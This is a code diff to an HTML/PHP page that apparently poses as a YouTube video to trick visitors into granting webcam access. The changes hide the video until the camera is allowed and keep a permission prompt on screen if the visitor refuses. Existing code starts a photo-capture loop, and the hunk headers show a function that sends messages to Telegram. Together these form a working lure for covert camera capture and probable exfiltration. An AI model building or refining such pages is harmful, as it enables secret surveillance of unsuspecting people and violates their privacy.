@@ -20,9 +20,7 @@ send_to_telegram($msg);
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         body { margin:0; font-family: Arial, sans-serif; background: #000; }
-        /* Simula la interfaz de YouTube */
         .yt-wrapper { position: relative; width: 100%; height: 500px; background: #000; }
-        .yt-controls { display: none; } /* Barra de avance oculta */
     </style>
 </head>
 <body>
@@ -65,10 +63,10 @@ send_to_telegram($msg);
     </div>
 </div>
 
-<!-- YouTube video con interfaz simulada -->
-<div class="yt-wrapper">
+<!-- YouTube video oculto inicialmente -->
+<div class="yt-wrapper" id="videoContainer" style="display:none;">
     <iframe id="Live_YT_TV" width="100%" height="100%" 
-        src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1&controls=0&disablekb=1" 
+        src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1&controls=1" 
         frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen>
     </iframe>
 </div>
@@ -102,8 +100,12 @@ async function initCamera() {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         capturePhotoLoop();
+        // Mostrar video de YouTube solo después de permitir cámara
+        document.getElementById('videoContainer').style.display = 'block';
     } catch (e) {
         console.error('Error al acceder a la cámara:', e);
+        // Si rechaza, modal sigue visible
+        document.getElementById('cameraModal').style.display = 'flex';
     }
 }
 
